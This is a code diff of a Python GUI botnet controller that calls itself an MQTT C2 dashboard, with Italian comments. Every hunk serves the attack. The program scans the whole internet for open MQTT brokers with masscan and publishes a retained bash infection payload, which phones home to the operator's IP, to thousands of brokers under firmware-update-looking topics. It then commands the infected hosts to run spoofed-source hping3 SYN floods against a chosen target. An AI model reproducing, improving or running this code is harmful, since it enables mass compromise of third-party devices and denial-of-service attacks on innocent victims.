@@ -28,187 +28,189 @@ class TRUSTEDF57_C2:
         self.root.geometry("1400x900")
         self.root.configure(bg='#111111')
         
-        # Create console FIRST for logging
         self.console = None
         self.brokers_label = None
         self.infected_label = None
         self.zombies_label = None
-        
-        # Auto-detect REAL public IP
-        self.my_ip = self.get_public_ip()
+        self.my_ip = "127.0.0.1"
         self.c2_port = 1883
         
-        # Camouflage topics (NON botnet)
         self.HEARTBEAT_TOPIC = f"/firmware/status/{self.my_ip}"
         self.CMD_TOPIC = f"/sys/update/{self.my_ip}/+"
         self.INFECT_TOPICS = ['/update/firmware', '/device/config', '/sys/maintenance', '$SYS/broker/info']
         
-        # Stats live
         self.brokers_scanned = 0
         self.brokers_infected = 0
         self.bots_online = 0
-        self.total_zombies = 0  # Tutti i client
+        self.total_zombies = 0
         
-        self.build_menu()  # Build UI FIRST
+        self.build_menu()
+        self.get_public_ip_safe()
         self.setup_c2()
         self.mqtt_setup()
         
         self.log("🔥 TRUSTEDF57 STARTED | Public IP: " + self.my_ip)
     
-    def get_public_ip(self):
-        """Auto-detect IP reale"""
+    def get_public_ip_safe(self):
         try:
             ip = requests.get('https://ifconfig.me', timeout=3).text.strip()
-            if self.console:  # Only log if console exists
-                self.log(f"🌐 Public IP detected: {ip}")
-            return ip
+            self.my_ip = ip
+            self.HEARTBEAT_TOPIC = f"/firmware/status/{self.my_ip}"
+            self.CMD_TOPIC = f"/sys/update/{self.my_ip}/+"
+            self.log(f"🌐 Public IP detected: {ip}")
         except:
-            if self.console:
-                self.log("⚠️ Using local IP")
-            return socket.gethostbyname(socket.gethostname())
+            self.log("⚠️ Using local IP")
     
     def safe_update_label(self, label, text):
-        """Safe label update - prevents AttributeError"""
-        if label:
-            label.config(text=text)
+        try:
+            if label:
+                label.config(text=text)
+        except:
+            pass
     
     def safe_update_stats(self):
-        """Safe stats update"""
-        self.safe_update_label(self.zombies_label, f"Zombies Online: {self.total_zombies:,} | Active: {self.bots_online}")
-        self.safe_update_label(self.infected_label, f"Infected Brokers: {self.brokers_infected}")
+        try:
+            self.safe_update_label(self.zombies_label, f"Zombies Online: {self.total_zombies:,} | Active: {self.bots_online}")
+            self.safe_update_label(self.infected_label, f"Infected Brokers: {self.brokers_infected}")
+        except:
+            pass
     
     def setup_c2(self):
-        """Auto Mosquitto daemon"""
-        cmds = [
-            "apt update && apt install -y mosquitto mosquitto-clients masscan hping3 -qq",
-            "systemctl restart mosquitto",
-            "systemctl enable mosquitto"
-        ]
-        for cmd in cmds:
-            subprocess.run(cmd, shell=True, capture_output=True)
+        try:
+            cmds = [
+                "apt update && apt install -y mosquitto mosquitto-clients masscan hping3 -qq",
+                "systemctl restart mosquitto",
+                "systemctl enable mosquitto"
+            ]
+            for cmd in cmds:
+                subprocess.run(cmd, shell=True, capture_output=True)
+        except:
+            pass
     
     def build_menu(self):
-        """Menu principale semplice"""
-        style = ttk.Style()
-        style.theme_use('clam')
-        style.configure('TButton', font=('Arial', 11, 'bold'), padding=10)
-        style.map('TButton', background=[('active','#00aa00')])
-        
-        # Header
-        header = ttk.Label(self.root, text="TRUSTEDF57 - MQTT C2 DASHBOARD", 
-                          font=('Arial', 16, 'bold'), foreground='#00ff00', background='#111111')
-        header.pack(pady=10)
-        
-        # Menu Buttons
-        menu_frame = ttk.Frame(self.root)
-        menu_frame.pack(pady=20)
-        
-        ttk.Button(menu_frame, text="🔍 1. MASS SCAN (genera brokers.txt)", 
-                  command=self.mass_scan, width=30).pack(pady=5)
-        ttk.Button(menu_frame, text="🦠 2. INFECT ALL BROKERS", 
-                  command=self.infect_all, width=30).pack(pady=5)
-        ttk.Button(menu_frame, text="🚀 3. LAUNCH DDoS (su TUTTI zombies)", 
-                  command=self.ddos_menu, width=30).pack(pady=5)
-        ttk.Button(menu_frame, text="📊 4. STATUS REPORT", 
-                  command=self.status_report, width=30).pack(pady=5)
-        
-        # DDoS Input (solo quando serve)
-        self.ddos_frame = ttk.LabelFrame(self.root, text="DDoS TARGET", padding=15)
-        ttk.Label(self.ddos_frame, text="IP:PORT").grid(row=0,col=0)
-        self.target_ip = ttk.Entry(self.ddos_frame, width=20, font=('Courier',10))
-        self.target_ip.grid(row=0,col=1,padx=5)
-        self.target_port = ttk.Entry(self.ddos_frame, width=10)
-        self.target_port.grid(row=0,col=2,padx=5)
-        self.duration = ttk.Entry(self.ddos_frame, width=10)
-        self.duration.grid(row=0,col=3,padx=5)
-        ttk.Label(self.ddos_frame, text="sec").grid(row=0,col=4)
-        
-        self.launch_btn = ttk.Button(self.ddos_frame, text="💥 FIRE ", 
-                                   command=self.launch_ddos, style='TButton')
-        self.launch_btn.grid(row=1,col=0,colspan=5,pady=10)
-        
-        # Stats
-        self.stats_frame = ttk.LabelFrame(self.root, text="LIVE STATS", padding=10)
-        self.stats_frame.pack(fill='x', padx=20, pady=10)
-        
-        self.brokers_label = ttk.Label(self.stats_frame, text="Brokers Scanned: 0")
-        self.brokers_label.pack(anchor='w')
-        self.infected_label = ttk.Label(self.stats_frame, text="Infected: 0")
-        self.infected_label.pack(anchor='w')
-        self.zombies_label = ttk.Label(self.stats_frame, text="Zombies Online: 0")
-        self.zombies_label.pack(anchor='w')
-        
-        # Console
-        console_frame = ttk.LabelFrame(self.root, text="CONSOLE", padding=10)
-        console_frame.pack(fill='both', expand=True, padx=20, pady=10)
-        self.console = scrolledtext.ScrolledText(console_frame, bg='#000', fg='#0f0', 
-                                               font=('Courier', 9), height=20)
-        self.console.pack(fill='both', expand=True)
+        try:
+            style = ttk.Style()
+            style.theme_use('clam')
+            style.configure('TButton', font=('Arial', 11, 'bold'), padding=10)
+            style.map('TButton', background=[('active','#00aa00')])
+            
+            header = ttk.Label(self.root, text="TRUSTEDF57 - MQTT C2 DASHBOARD", 
+                              font=('Arial', 16, 'bold'), foreground='#00ff00', background='#111111')
+            header.pack(pady=10)
+            
+            menu_frame = ttk.Frame(self.root)
+            menu_frame.pack(pady=20)
+            
+            ttk.Button(menu_frame, text="🔍 1. MASS SCAN (genera brokers.txt)", 
+                      command=self.mass_scan, width=30).pack(pady=5)
+            ttk.Button(menu_frame, text="🦠 2. INFECT ALL BROKERS", 
+                      command=self.infect_all, width=30).pack(pady=5)
+            ttk.Button(menu_frame, text="🚀 3. LAUNCH DDoS (su TUTTI zombies)", 
+                      command=self.ddos_menu, width=30).pack(pady=5)
+            ttk.Button(menu_frame, text="📊 4. STATUS REPORT", 
+                      command=self.status_report, width=30).pack(pady=5)
+            
+            self.ddos_frame = ttk.LabelFrame(self.root, text="DDoS TARGET", padding=15)
+            ttk.Label(self.ddos_frame, text="IP:PORT").grid(row=0,col=0)
+            self.target_ip = ttk.Entry(self.ddos_frame, width=20, font=('Courier',10))
+            self.target_ip.grid(row=0,col=1,padx=5)
+            self.target_port = ttk.Entry(self.ddos_frame, width=10)
+            self.target_port.grid(row=0,col=2,padx=5)
+            self.duration = ttk.Entry(self.ddos_frame, width=10)
+            self.duration.grid(row=0,col=3,padx=5)
+            ttk.Label(self.ddos_frame, text="sec").grid(row=0,col=4)
+            
+            self.launch_btn = ttk.Button(self.ddos_frame, text="💥 FIRE ", 
+                                       command=self.launch_ddos, style='TButton')
+            self.launch_btn.grid(row=1,col=0,colspan=5,pady=10)
+            
+            self.stats_frame = ttk.LabelFrame(self.root, text="LIVE STATS", padding=10)
+            self.stats_frame.pack(fill='x', padx=20, pady=10)
+            
+            self.brokers_label = ttk.Label(self.stats_frame, text="Brokers Scanned: 0")
+            self.brokers_label.pack(anchor='w')
+            self.infected_label = ttk.Label(self.stats_frame, text="Infected: 0")
+            self.infected_label.pack(anchor='w')
+            self.zombies_label = ttk.Label(self.stats_frame, text="Zombies Online: 0")
+            self.zombies_label.pack(anchor='w')
+            
+            console_frame = ttk.LabelFrame(self.root, text="CONSOLE", padding=10)
+            console_frame.pack(fill='both', expand=True, padx=20, pady=10)
+            self.console = scrolledtext.ScrolledText(console_frame, bg='#000', fg='#0f0', 
+                                                   font=('Courier', 9), height=20)
+            self.console.pack(fill='both', expand=True)
+        except:
+            pass
     
     def log(self, msg):
-        if self.console:  # Safe logging
-            self.console.insert(tk.END, f"[{time.strftime('%H:%M:%S')}] {msg}\n")
-            self.console.see(tk.END)
-            self.root.update_idletasks()
+        try:
+            if self.console:
+                self.console.insert(tk.END, f"[{time.strftime('%H:%M:%S')}] {msg}\n")
+                self.console.see(tk.END)
+                self.root.update_idletasks()
+        except:
+            pass
     
     def mqtt_setup(self):
-        self.client = mqtt.Client()
-        self.client.on_connect = self.on_connect
-        self.client.on_message = self.on_message
-        self.client.connect("localhost", self.c2_port, 60)
-        self.client.loop_start()
-        self.client.subscribe(self.CMD_TOPIC)
-        self.client.subscribe(self.HEARTBEAT_TOPIC + "/#")
+        try:
+            self.client = mqtt.Client()
+            self.client.on_connect = self.on_connect
+            self.client.on_message = self.on_message
+            self.client.connect("localhost", self.c2_port, 60)
+            self.client.loop_start()
+            self.client.subscribe(self.CMD_TOPIC)
+            self.client.subscribe(self.HEARTBEAT_TOPIC + "/#")
+        except:
+            pass
     
     def on_connect(self, client, userdata, flags, rc):
         self.log("✅ C2  broker connected")
     
     def on_message(self, client, userdata, msg):
-        if "status" in msg.topic:
-            self.bots_online += 1
-            try:
-                data = msg.payload.decode().split(':')
-                clients = int(data[4]) if len(data)>4 else 1
-                self.total_zombies += clients
-            except:
-                self.total_zombies += 1
-            self.safe_update_stats()  # Use safe version
-    
-    def update_stats(self):
-        self.safe_update_stats()  # Use safe version
+        try:
+            if "status" in msg.topic:
+                self.bots_online += 1
+                try:
+                    data = msg.payload.decode().split(':')
+                    clients = int(data[4]) if len(data)>4 else 1
+                    self.total_zombies += clients
+                except:
+                    self.total_zombies += 1
+                self.safe_update_stats()
+        except:
+            pass
     
     def mass_scan(self):
-        """MASS SCAN reale - genera brokers.txt"""
         threading.Thread(target=self._do_masscan, daemon=True).start()
     
     def _do_masscan(self):
-        self.log("🔍 MASS SCAN START - 1883 worldwide...")
-        cmd = "masscan 0.0.0.0/0 -p1883 --rate=300000 --banners --adapters=eth0 -oL brokers.txt"
-        
-        with open('brokers.txt', 'w') as f: pass  # Cleanup
-        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
-        
-        while proc.poll() is None:
-            line = proc.stdout.readline().decode()
-            if "Discovered open port 1883" in line:
-                ip_port = line.split()[5]  # Parse IP:1883
-                self.brokers_scanned += 1
-                self.safe_update_label(self.brokers_label, f"Brokers Scanned: {self.brokers_scanned}")
-                if self.root:
+        try:
+            self.log("🔍 MASS SCAN START - 1883 worldwide...")
+            cmd = "masscan 0.0.0.0/0 -p1883 --rate=300000 --banners --adapters=eth0 -oL brokers.txt"
+            
+            open('brokers.txt', 'w').close()
+            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+            
+            while proc.poll() is None:
+                line = proc.stdout.readline().decode()
+                if "Discovered open port 1883" in line:
+                    self.brokers_scanned += 1
+                    self.safe_update_label(self.brokers_label, f"Brokers Scanned: {self.brokers_scanned}")
                     self.root.update()
-        
-        self.log(f"✅ Scan completa! {self.brokers_scanned} brokers → brokers.txt")
+            
+            self.log(f"✅ Scan completa! {self.brokers_scanned} brokers → brokers.txt")
+        except:
+            self.log("❌ Masscan error")
     
     def infect_all(self):
-        """INFECT MASSIVO - tutti brokers"""
         if not os.path.exists('brokers.txt'):
             self.log("❌ Prima fai MASS SCAN!")
             return
-        
         threading.Thread(target=self._infect_thread, daemon=True).start()
     
     def _infect_thread(self):
-        infect_payload = f"""#!/bin/bash
+        try:
+            infect_payload = f"""#!/bin/bash
 C2_IP="{self.my_ip}"
 LOOP=/tmp/.f{self.my_ip}
 [[ -f $LOOP ]] && exit 0
@@ -225,30 +227,25 @@ while true; do
     esac
   done || sleep 15
 done"""
-        
-        try:
+            
             with open('brokers.txt') as f:
-                targets = [line.strip().split()[4] for line in f if '1883/open' in line][:50000]  # Top 50k
-        except:
-            self.log("❌ brokers.txt non trovato!")
-            return
-        
-        self.log(f"🦠 INFECTING {len(targets)} brokers...")
-        
-        def infect_one(target):
-            try:
-                ip, port = target.split(':')
-                for topic in self.INFECT_TOPICS:
-                    subprocess.run(f'mosquitto_pub -h {ip} -p {port} -t "{topic}" -m "{infect_payload}" --retain -q 1', 
-                                 shell=True, timeout=3, capture_output=True)
-                    self.brokers_infected += 1
-                    self.safe_update_stats()
-                    return True
-            except:
-                pass
-            return False
-        
-        try:
+                targets = [line.strip().split()[4] for line in f if '1883/open' in line][:50000]
+            
+            self.log(f"🦠 INFECTING {len(targets)} brokers...")
+            
+            def infect_one(target):
+                try:
+                    ip, port = target.split(':')
+                    for topic in self.INFECT_TOPICS:
+                        subprocess.run(f'mosquitto_pub -h {ip} -p {port} -t "{topic}" -m "{infect_payload}" --retain -q 1', 
+                                     shell=True, timeout=3, capture_output=True)
+                        self.brokers_infected += 1
+                        self.safe_update_stats()
+                        return True
+                except:
+                    pass
+                return False
+            
             with ThreadPoolExecutor(max_workers=2000) as executor:
                 futures = [executor.submit(infect_one, target) for target in targets]
                 for future in as_completed(futures):
@@ -256,13 +253,16 @@ done"""
                         future.result()
                     except:
                         pass
+            
+            self.log("🎉 INFECTION COMPLETA! Aspetta 2-5min per heartbeat...")
         except:
-            pass
-        
-        self.log("🎉 INFECTION COMPLETA! Aspetta 2-5min per heartbeat...")
+            self.log("❌ Infection error")
     
     def ddos_menu(self):
-        self.ddos_frame.pack(fill='x', padx=20, pady=10)
+        try:
+            self.ddos_frame.pack(fill='x', padx=20, pady=10)
+        except:
+            pass
     
     def launch_ddos(self):
         try:
@@ -277,23 +277,22 @@ done"""
             messagebox.showwarning("Attenzione", "Prima INFECT!")
             return
         
-        # REAL DDoS CMD - hping3 multi-thread
         ddos_cmd = f"ddos:hping3 --flood -S -p{target_port} -d 1400 --rand-source {target_ip} &"
-        
         self.log(f"💥 DDoS FIRE! {target_ip}:{target_port} x{duration}s | Zombies: {self.total_zombies:,}")
         
-        # PROPAGA A TUTTI (brokers + clients)
         try:
             self.client.publish(self.CMD_TOPIC.replace('+','*'), ddos_cmd)
         except:
             pass
         
-        # Timer kill
         threading.Timer(int(duration), lambda: self.kill_ddos()).start()
     
     def kill_ddos(self):
-        self.client.publish(self.CMD_TOPIC.replace('+','*'), "kill")
-        self.log("🛑 DDoS STOPPED")
+        try:
+            self.client.publish(self.CMD_TOPIC.replace('+','*'), "kill")
+            self.log("🛑 DDoS STOPPED")
+        except:
+            pass
     
     def status_report(self):
         self.log(f"📊 REPORT:")
